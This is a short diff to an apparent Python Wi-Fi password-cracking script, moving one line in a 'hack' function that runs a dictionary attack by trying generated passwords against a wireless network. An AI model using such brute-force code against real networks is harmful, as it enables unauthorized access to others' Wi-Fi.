@@ -43,9 +43,9 @@ def gen_passwd():
 
 def hack(interface, cell):
     print('starting dictionary attack...')
+    name = int(time.time())
     for password in gen_passwd():
         err = False
-        name = int(time.time())
         try:
             print('   now trying: {0}'.format(password))
             scheme = wifi.Scheme.for_cell(interface, name, cell, password)
